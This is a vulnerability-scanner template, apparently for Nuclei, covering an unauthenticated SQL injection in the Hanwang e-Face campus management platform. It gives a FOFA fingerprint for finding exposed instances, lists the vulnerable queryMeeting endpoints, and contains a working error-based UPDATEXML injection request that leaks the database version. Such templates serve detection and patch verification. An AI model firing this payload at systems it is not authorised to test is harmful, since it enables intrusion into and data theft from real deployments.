id: hanwang-faceid-querymeeting-sql

info:
  name: "汉王e脸通综合管理平台 queryMeeting.do 等接口SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: icon_hash="1380907357"
        汉王e脸通综合管理平台是汉王科技股份有限公司开发的生物识别智慧园区管理系统，包含考勤、门禁、访客等八大功能模块。经分析发现，queryMeetingFile.do、queryMeetingRoom.do、queryMeetingEmployee.do、queryMeetingRecord.do、queryMeetingAudit.do、queryMeeting.do 等接口存在SQL注入缺陷。攻击者可通过构造恶意请求参数，在未认证状态下执行任意SQL语句，导致数据库敏感信息泄露、数据篡改及系统权限提升，破坏系统数据的机密性与完整性。
        queryMeetingFile.do、queryMeetingRoom.do、queryMeetingEmployee.do、queryMeetingRecord.do、queryMeetingAudit.do、queryMeeting.do
  tags: 汉王e脸通综合管理平台

http:
- raw:
  - |
    GET /manage/meeting/queryMeetingAudit.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&order=DESC&state=2 HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'XPATH'
